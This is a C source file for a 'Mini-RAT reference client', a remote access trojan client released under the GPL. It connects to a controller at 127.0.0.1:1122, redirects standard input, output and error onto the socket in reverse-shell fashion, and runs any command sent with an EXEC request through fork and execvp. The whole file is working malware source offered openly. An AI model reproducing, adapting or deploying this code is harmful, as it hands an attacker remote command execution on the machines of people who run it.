/*
 * Mini-RAT reference client
 * Copyright (C) 2023 Danny Holman <dholman@gymli.org>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <util.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <string.h>

int open_connection(const char *addr, int port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, addr, &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1)
                return -1;
        return sock;
}

void hostinfo(int socket) {
        send(socket, "NOT IMPLEMENTED\r\n", 17, 0);
}

void run_exec(int socket, const char **argv) {
        pid_t pid = fork();
        if (pid == 0) {
                execvp(argv[0], argv);
                exit(0);
        } else if (pid > 0) {
                wait(NULL);
        } else {
                send(socket, "ERROR EXECUTING COMMAND", 23, 0);
        }
}

int handle_request(int socket, char *req) {
        char **tokens = str_split(req, "\r\n");

        if (strcmp(tokens[0], "HOSTINFO") == 0) {
                hostinfo(socket);
        } else if (strncmp(tokens[0], "EXEC", 4) == 0) {
                char **argv = str_split(req, " ");
                run_exec(socket, &argv[1]);
        } else if (strncmp(tokens[0], "EXIT", 4) == 0) {
                return 1;
        }
        return 0;
}

int main(int argc, char* argv[]) {
        int socket = 0;
        int retries = 0;
        while (retries < 3 && socket == 0) {
                socket = open_connection("127.0.0.1", 1122);
                if (socket == 0)
                        perror(argv[0]);
                retries++;
        }

        if (socket == 0)
                return -1;
     
        dup2(socket, STDOUT_FILENO);
        dup2(socket, STDERR_FILENO);
        dup2(socket, STDIN_FILENO);
        char buffer[4096];
        while (1) {
                if (recv(socket, buffer, 4096, 0) <= 0)
                        break;
                if (handle_request(socket, buffer) == 1)
                        break;
                memset(buffer, 0, 4096);
        }
        return 0;
}